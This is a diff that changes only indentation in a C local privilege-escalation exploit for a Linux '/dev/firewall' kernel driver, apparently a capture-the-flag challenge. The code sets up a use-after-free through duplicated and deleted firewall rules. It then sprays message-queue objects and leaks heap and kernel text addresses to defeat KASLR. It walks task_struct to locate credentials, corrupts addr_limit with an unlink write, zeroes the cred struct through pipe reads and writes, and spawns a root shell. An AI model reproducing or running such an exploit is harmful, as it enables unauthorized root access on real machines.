@@ -54,33 +54,33 @@ char driver_path[] = "/dev/firewall";
 #endif
 typedef struct user_rule
 {
-    char iface[16];
-    char name[16];
-    char ip[16];
-    char netmask[16];
-    uint8_t idx;
-    uint8_t type;
-    uint16_t proto;
-    uint16_t port;
-    uint8_t action;
-    #ifdef EASY_MODE
-    char desc[DESC_MAX];
-    #endif
+  char iface[16];
+  char name[16];
+  char ip[16];
+  char netmask[16];
+  uint8_t idx;
+  uint8_t type;
+  uint16_t proto;
+  uint16_t port;
+  uint8_t action;
+#ifdef EASY_MODE
+  char desc[DESC_MAX];
+#endif
 } user_rule_t;
 
 typedef struct rule
 {
-    char iface[16];
-    char name[16];
-    uint32_t ip;
-    uint32_t netmask;
-    uint16_t proto;
-    uint16_t port;
-    uint8_t action;
-    uint8_t is_duplicated;
-    #ifdef EASY_MODE
-    char desc[DESC_MAX];
-    #endif
+  char iface[16];
+  char name[16];
+  uint32_t ip;
+  uint32_t netmask;
+  uint16_t proto;
+  uint16_t port;
+  uint8_t action;
+  uint8_t is_duplicated;
+#ifdef EASY_MODE
+  char desc[DESC_MAX];
+#endif
 } rule_t;
 
 int add_rule(int idx,char * iface, char * name,char * ip,char * netmask,uint8_t type,uint16_t proto,uint16_t port,uint8_t action)
@@ -146,15 +146,15 @@ int dup_rule(int idx,int type)
 
 
 /*
-uname -r
-5.8.0
- */
+  uname -r
+  5.8.0
+*/
 
 /*
-struct msgbuf {
+  struct msgbuf {
   long mtype;       // message type, must be > 0 
   char mtext[0x1];    //message data 
-};
+  };
 */
 
 
@@ -196,7 +196,7 @@ int is_kaddr(unsigned long long addr)
   return 0;
 }
 
-  unsigned long long kstack_kheap_upper = 0xffff000000000000;
+unsigned long long kstack_kheap_upper = 0xffff000000000000;
 //is kstack or kheap address
 int is_kstack_kheap_addr(unsigned long long addr)
 {
@@ -310,37 +310,36 @@ void dump_qword(unsigned long long * buff, int n)
 int read_n(char * addr,int n,char * buff) //try not to read more than (0x1000 - 8) bytes by the way
 {
   int rv = 0;
-struct msgbuf *msgbuf_ptr = 0;
- struct user_rule user_rule_struct = {0};
- struct user_rule * rule_ptr = 0;
- unsigned long long * qword_ptr = 0;
- int read_size = 1024;
- read_size = n;
+  struct msgbuf *msgbuf_ptr = 0;
+  struct user_rule user_rule_struct = {0};
+  struct user_rule * rule_ptr = 0;
+  unsigned long long * qword_ptr = 0;
+  int read_size = 1024;
+  read_size = n;
 
- rule_ptr = &user_rule_struct;
+  rule_ptr = &user_rule_struct;
   memset(user_rule_struct.iface,0,0x10);
   memset(user_rule_struct.name,0,0x10);
 
   //addr_to_rule_ipnetmask(addr - 8,&user_rule_struct);
- addr_to_rule_ipnetmask(addr - 8,rule_ptr);
+  addr_to_rule_ipnetmask(addr - 8,rule_ptr);
 
   qword_ptr = &(rule_ptr->name[0]);
   qword_ptr[0] = 1;//set type
 
   qword_ptr[1] = (0x1000 - 0x30) + (read_size);//increase size
 
-rv = edit_rule(0,rule_ptr->iface,rule_ptr->name,rule_ptr->ip,rule_ptr->netmask,OUTBOUND,0,0,0);
-//printf("edit_rule() returned %i\n",rv);
- msgbuf_ptr = read_scratch;
- msgbuf_ptr->mtype = 1;
- //read_primitive_msg_idx
+  rv = edit_rule(0,rule_ptr->iface,rule_ptr->name,rule_ptr->ip,rule_ptr->netmask,OUTBOUND,0,0,0);
+  //printf("edit_rule() returned %i\n",rv);
+  msgbuf_ptr = read_scratch;
+  msgbuf_ptr->mtype = 1;
+  //read_primitive_msg_idx
   rv = rcv_msgqueue_n_external(read_primitive_msg_queue_id,msgbuf_ptr,(0x1000 - 0x30) + (read_size),read_primitive_msg_idx,MSG_COPY | IPC_NOWAIT);//read message at ordinal position 0
   //printf("msgrcv() returned %i\n",rv);
 
-  //if rv != (0x1000 - 0x30) + 8, then we can return error
   {
-    //printf("[read_8]test for swappercomm = '%s'\n",msgbuf_ptr->mtext + 4048);
-  memcpy(buff,msgbuf_ptr->mtext + 4048,read_size);
+
+    memcpy(buff,msgbuf_ptr->mtext + 4048,read_size);
   }
   if (rv > 0 && (rv== (4048 + read_size)))
     {
@@ -406,7 +405,7 @@ int busy_loop()
 {
   int i = 0;
   char buff[0x20] = {0};
-      memset(buff,0x41,10);
+  memset(buff,0x41,10);
   while (1)
     {
       //prctl(PR_GET_NAME,buff);
@@ -419,11 +418,11 @@ int busy_loop()
 int make_busy_loop_thread()
 {
   int rv = 0;
-char *   thread_stack = 0;
- thread_stack = mmap(0,0x1000*8,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
-rv  =  clone(busy_loop,thread_stack + 0x1000*8,CLONE_VM,0);
-//printf("clone() returned %i\n",rv);
- return rv;
+  char *   thread_stack = 0;
+  thread_stack = mmap(0,0x1000*8,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
+  rv  =  clone(busy_loop,thread_stack + 0x1000*8,CLONE_VM,0);
+  //printf("clone() returned %i\n",rv);
+  return rv;
 }
 
 int task_struct_tasks_offset = 0x298;
@@ -435,8 +434,8 @@ char * task_struct_buff = 0;
 unsigned long long _find_task(int pid)
 {
   char * data = 0;
-struct msgbuf *msgbuf_ptr = 0;
- int curr_pid;
+  struct msgbuf *msgbuf_ptr = 0;
+  int curr_pid;
   unsigned long long curr_task = init_task;
   unsigned long long next_task = 0;
   if (task_struct_buff == 0)
@@ -461,17 +460,17 @@ struct msgbuf *msgbuf_ptr = 0;
 	}
 
 
-next_task = *(unsigned long long *)((data + task_struct_tasks_offset) - (safe_read_offset + 8));
- next_task = next_task  - task_struct_tasks_offset;
- printf("got next_task = '%p'\n",next_task);
- {
-   //dump_qword(task_struct_buff,900);
+      next_task = *(unsigned long long *)((data + task_struct_tasks_offset) - (safe_read_offset + 8));
+      next_task = next_task  - task_struct_tasks_offset;
+      printf("got next_task = '%p'\n",next_task);
+      {
+	//dump_qword(task_struct_buff,900);
 
-   //dump_qword(task_struct_buff,900);
- }
+	//dump_qword(task_struct_buff,900);
+      }
 
- //getchar();
- curr_task = next_task;
+      //getchar();
+      curr_task = next_task;
     }
 
 
@@ -534,9 +533,9 @@ int main(int argc, char * argv[])
   buff2 = mmap(0,0x1000*2,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
   buff3 = mmap(0,0x1000*4,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
   buff4 = mmap(0,0x1000*4,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
-leakbuff1= mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
-read_scratch = mmap(0,0x1000*10,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
- search = mmap(0,0x1000*2,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
+  leakbuff1= mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
+  read_scratch = mmap(0,0x1000*10,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
+  search = mmap(0,0x1000*2,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRIVATE,-1,0);
 
   printf("buff = %p\n",buff);
   rv = msgget(IPC_PRIVATE,0666);
@@ -560,17 +559,17 @@ read_scratch = mmap(0,0x1000*10,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRI
   rv = add_rule(1,buff2,buff2+0x10,"0.0.0.0","0.0.0.0",INBOUND,0x5,0x5,0x5); //B for unlink
   printf("add_rule() returned %i\n",rv);
   if (1)
-  {
-  rv = add_rule(2,buff2,buff2+0x10,"0.0.0.0","0.0.0.0",INBOUND,0x5,0x6,0x6); //
-  printf("add_rule() returned %i\n",rv);
-  }
+    {
+      rv = add_rule(2,buff2,buff2+0x10,"0.0.0.0","0.0.0.0",INBOUND,0x5,0x6,0x6); //
+      printf("add_rule() returned %i\n",rv);
+    }
   rv = dup_rule(0,INBOUND);//A
   rv = dup_rule(1,INBOUND);//B
   if(debug)
-  {
-  printf("waiting (post dup)...\n");
-  getchar();
-  }
+    {
+      printf("waiting (post dup)...\n");
+      getchar();
+    }
   rv = delete_rule(0,INBOUND);//free A while having a reference to it in the outbound table
 
 
@@ -585,10 +584,10 @@ read_scratch = mmap(0,0x1000*10,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRI
   //we can test to see if we got the object again depending on whether r not we can read more than 16 bytes //I should do this for both, but w/e
 
   for(i = 0;i<0x1000/0x30;i++)
-  {
-  rv = make_busy_loop_thread();
-  //printf("make_busy_loop_thread() returned %i\n",rv);
-  }
+    {
+      rv = make_busy_loop_thread();
+      //printf("make_busy_loop_thread() returned %i\n",rv);
+    }
 
 
   //edit A via the outbound table to corrupt the size field
@@ -601,7 +600,7 @@ read_scratch = mmap(0,0x1000*10,PROT_READ | PROT_WRITE, MAP_ANONYMOUS  | MAP_PRI
   qword_ptr[0] = 1;//increase size
   qword_ptr[1] = 0x1000 - 0x30;//increase size
   rv = edit_rule(0,rule_ptr->iface,rule_ptr->name,"0.0.0.0","0.0.0.0",OUTBOUND,0,0,0);
-printf("edit_rule() returned %i\n",rv);    
+  printf("edit_rule() returned %i\n",rv);    
 
   //with msg_copy, mtyp specifies the index of the message
   msgbuf_ptr = buff2;
@@ -609,11 +608,11 @@ printf("edit_rule() returned %i\n",rv);
   rv = rcv_msgqueue_n_external(v_msg_queue_id,msgbuf_ptr,4096-0x30,0,MSG_COPY | IPC_NOWAIT);//read message at ordinal position 0
   printf("msgrcv() returned %i\n",rv);
 
- if (debug)
-  {
-  printf("msgrcv buffer: \n");
-  dump_qword(msgbuf_ptr->mtext,4048/8);
-  }
+  if (debug)
+    {
+      printf("msgrcv buffer: \n");
+      dump_qword(msgbuf_ptr->mtext,4048/8);
+    }
 
   memcpy(leakbuff1,msgbuf_ptr->mtext,4048);
   qword_ptr = leakbuff1;
@@ -624,10 +623,10 @@ printf("edit_rule() returned %i\n",rv);
   find_sht_leaks(leakbuff1,0x1000);
   printf("%i possible leaks...\n",leak_arr1_count);
   if (debug)
-  {
-  printf("leak arr:\n");
-  dump_qword(leak_arr1,leak_arr1_count);
-  }
+    {
+      printf("leak arr:\n");
+      dump_qword(leak_arr1,leak_arr1_count);
+    }
 
   //find stack leak?
   for( i = 0;i<leak_arr1_count;i++)
@@ -648,8 +647,8 @@ printf("edit_rule() returned %i\n",rv);
       printf("[from find_leak()] kheap_leak  = %p\n",kheap_leak);
     }
 
-      text_leak = find_text_leak(leakbuff1,4048);
-      printf("[from find_text_leak()] text_leak  = %p\n",text_leak);
+  text_leak = find_text_leak(leakbuff1,4048);
+  printf("[from find_text_leak()] text_leak  = %p\n",text_leak);
 
 
   if (kheap_leak == 0)
@@ -661,7 +660,7 @@ printf("edit_rule() returned %i\n",rv);
   
   kheap_ptr = kheap_leak;
 
-    //read from kheap_ptr
+  //read from kheap_ptr
   rule_ptr = buff3;
   rule_ptr = buff4;
   read_primitive_msg_queue_id = v_msg_queue_id;//set global
@@ -677,10 +676,10 @@ printf("edit_rule() returned %i\n",rv);
   memset(msgbuf_ptr->mtext,0,0x1000*4 - 0x10);
 
   printf("waiting...\n");
- if (debug)
-  {
-  getchar();
-  }
+  if (debug)
+    {
+      getchar();
+    }
 
   
   {
@@ -695,18 +694,18 @@ printf("edit_rule() returned %i\n",rv);
 
 	printf("read_n returned %i\n",rv);
 
-	 if (debug)
-	{
-	dump_qword(search,0x2a0);
-	}
+	if (debug)
+	  {
+	    dump_qword(search,0x2a0);
+	  }
 
 	find_text_leaks(search,0x2a0);
 	printf("%i possible leaks...\n",leak_arr2_count);
 	if (debug)
-	{
-	printf("leak arr:\n");
-	dump_qword(leak_arr2,leak_arr2_count);
-	}
+	  {
+	    printf("leak arr:\n");
+	    dump_qword(leak_arr2,leak_arr2_count);
+	  }
 	for(i = 0;i<leak_arr2_count;i++)
 	  {
 	    if ((leak_arr2[i] & 0xfffULL) == (text_leak_base &0xfffULL))
@@ -742,9 +741,9 @@ printf("edit_rule() returned %i\n",rv);
     printf("mypid = %i\n",pid);
     printf("before looking for task struct...\n");
     if (debug)
-    {
-    getchar();
-    }
+      {
+	getchar();
+      }
     temp_task = _find_task(pid);
     printf("_find_task() returned %p\n",temp_task);
 
@@ -753,81 +752,81 @@ printf("edit_rule() returned %i\n",rv);
     //now let's try to use an unlink to write to addr_limit
 
     read_n(temp_task + safe_read_offset + 8,0x1000 - 8,search);
-cred_struct = *(unsigned long long *)((search + task_struct_cred_offset) - (safe_read_offset + 8));
- printf("got cred_struct @ %p\n",cred_struct);
+    cred_struct = *(unsigned long long *)((search + task_struct_cred_offset) - (safe_read_offset + 8));
+    printf("got cred_struct @ %p\n",cred_struct);
 
 
-  rule_ptr->name;
-  memset(rule_ptr->iface,0,0x10);//this overlaps with the linkage field (list_head)
-  //set addr-limit to the end of the data or bss section
-  //dumy_listhead
-  //dumy_listhead.next = ;
-  //dumy_listhead.prev = ;
-  //target = 0xc6a730 + stext
-  dumy_listhead.next = stext + 0xc6a730 - 8; //N
-  dumy_listhead.prev = addr_limit_loc; //P
-  memcpy(rule_ptr->iface,&dumy_listhead,0x10);
-  memset(rule_ptr->name,0,0x10);
-  qword_ptr = &(rule_ptr->name[0]);
-  qword_ptr[0] = 1;//
-  qword_ptr[1] = 0x10;//
-  rv = edit_rule(1,rule_ptr->iface,rule_ptr->name,"0.0.0.0","0.0.0.0",OUTBOUND,0,0,0);
-printf("edit_rule() returned %i\n",rv);    
+    rule_ptr->name;
+    memset(rule_ptr->iface,0,0x10);//this overlaps with the linkage field (list_head)
+    //set addr-limit to the end of the data or bss section
+    //dumy_listhead
+    //dumy_listhead.next = ;
+    //dumy_listhead.prev = ;
+    //target = 0xc6a730 + stext
+    dumy_listhead.next = stext + 0xc6a730 - 8; //N
+    dumy_listhead.prev = addr_limit_loc; //P
+    memcpy(rule_ptr->iface,&dumy_listhead,0x10);
+    memset(rule_ptr->name,0,0x10);
+    qword_ptr = &(rule_ptr->name[0]);
+    qword_ptr[0] = 1;//
+    qword_ptr[1] = 0x10;//
+    rv = edit_rule(1,rule_ptr->iface,rule_ptr->name,"0.0.0.0","0.0.0.0",OUTBOUND,0,0,0);
+    printf("edit_rule() returned %i\n",rv);    
 
-  dumy_listhead.next = stext + 0xc6a730 - 8; //N
-  dumy_listhead.prev = addr_limit_loc; //P
-  printf(" N = %p\n",dumy_listhead.next);
-  printf(" P = %p\n",dumy_listhead.prev);
+    dumy_listhead.next = stext + 0xc6a730 - 8; //N
+    dumy_listhead.prev = addr_limit_loc; //P
+    printf(" N = %p\n",dumy_listhead.next);
+    printf(" P = %p\n",dumy_listhead.prev);
     printf("addr_limit @ %p\n",addr_limit_loc);
- printf("before unlink attempt\n");
- if (debug)
-   {
- getchar();
-   }
-  msgbuf_ptr = buff2;
-  msgbuf_ptr->mtype = 1;
-   rv = rcv_msgqueue_n_external(v_msg_queue_id2,msgbuf_ptr,0x10,0,IPC_NOWAIT);//read message at ordinal position 0
+    printf("before unlink attempt\n");
+    if (debug)
+      {
+	getchar();
+      }
+    msgbuf_ptr = buff2;
+    msgbuf_ptr->mtype = 1;
+    rv = rcv_msgqueue_n_external(v_msg_queue_id2,msgbuf_ptr,0x10,0,IPC_NOWAIT);//read message at ordinal position 0
 
    
- printf("after unlink attempt\n");
- if (debug)
- {
- getchar();
- }
+    printf("after unlink attempt\n");
+    if (debug)
+      {
+	getchar();
+      }
 
 
- //we could go ahead and fill in read_addr() now (after we write to addr_limit again), but w/e
- rv = pipe(pipefds);
- printf("pipe() returned %i\n",rv);
- memset(buff,0,0x10);
- printf("buff = '%s'\n",buff);
- rv = write(pipefds[1],swapper_comm_base + kaslr_slide,0x10);
- printf("write() returned %i\n",rv);
- rv = read(pipefds[0],buff,0x10);
- printf("read() returned %i\n",rv);
- printf("buff = '%s'\n",buff);
+    //we could go ahead and fill in read_addr() now (after we write to addr_limit again), but w/e
+    rv = pipe(pipefds);
+    printf("pipe() returned %i\n",rv);
+    memset(buff,0,0x10);
+    printf("buff = '%s'\n",buff);
+    rv = write(pipefds[1],swapper_comm_base + kaslr_slide,0x10);
+    printf("write() returned %i\n",rv);
+    rv = read(pipefds[0],buff,0x10);
+    printf("read() returned %i\n",rv);
+    printf("buff = '%s'\n",buff);
 
- memset(buff,0x0,0x28);
- rv = write(pipefds[1],buff,0x28);
- printf("write() returned %i\n",rv);
- rv = read(pipefds[0],cred_struct,0x28);
- printf("read() returned %i\n",rv);
+    memset(buff,0x0,0x28);
+    rv = write(pipefds[1],buff,0x28);
+    printf("write() returned %i\n",rv);
+    rv = read(pipefds[0],cred_struct,0x28);
+    printf("read() returned %i\n",rv);
 
 
- memset(buff,0xff,0x8);
- rv = write(pipefds[1],buff,0x8);
- printf("write() returned %i\n",rv);
- rv = read(pipefds[0],addr_limit_loc,0x8);
- printf("read() returned %i\n",rv);
+    memset(buff,0xff,0x8);
+    rv = write(pipefds[1],buff,0x8);
+    printf("write() returned %i\n",rv);
+    rv = read(pipefds[0],addr_limit_loc,0x8);
+    printf("read() returned %i\n",rv);
 
- printf("uid = %i\n",getuid());
+    printf("uid = %i\n",getuid());
 
- //printf("booooo\n");
- if (getuid() == 0)
-   {
-     printf("got root!\n");
-     system("/bin/sh");
-   }
+    //printf("booooo\n");
+    if (getuid() == 0)
+      {
+	printf("got root!\n");
+	system("/bin/sh");
+      }
 
   }
 
@@ -835,8 +834,8 @@ printf("edit_rule() returned %i\n",rv);
 
   if (debug)
     {
-  printf("waiting...\n");
-  getchar();
+      printf("waiting...\n");
+      getchar();
     }
 
 
